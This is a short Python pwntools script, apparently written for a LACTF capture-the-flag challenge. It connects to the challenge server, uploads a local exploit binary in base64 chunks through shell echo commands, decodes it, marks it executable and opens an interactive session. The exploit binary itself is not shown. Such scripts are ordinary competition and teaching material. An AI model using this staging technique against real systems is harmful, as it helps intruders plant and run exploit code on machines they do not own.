#!/usr/bin/env python3
from pwn import *
import time
import base64
import os

HOST, PORT = 'chall.lac.tf', 31499

def run(cmd):
    sock.sendlineafter("$ ", cmd)
    sock.recvline()

with open("./exp", "rb") as f:
    payload = base64.b64encode(f.read()).decode()

sock = remote(HOST, PORT) # remote
# sock = process("./run.sh")

run('cd /tmp')

print("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run('echo "{}" >> b64exp'.format(payload[i:i+512]))

run('base64 -d b64exp > exploit')
run('rm b64exp')
run('chmod +x exploit')

sock.interactive()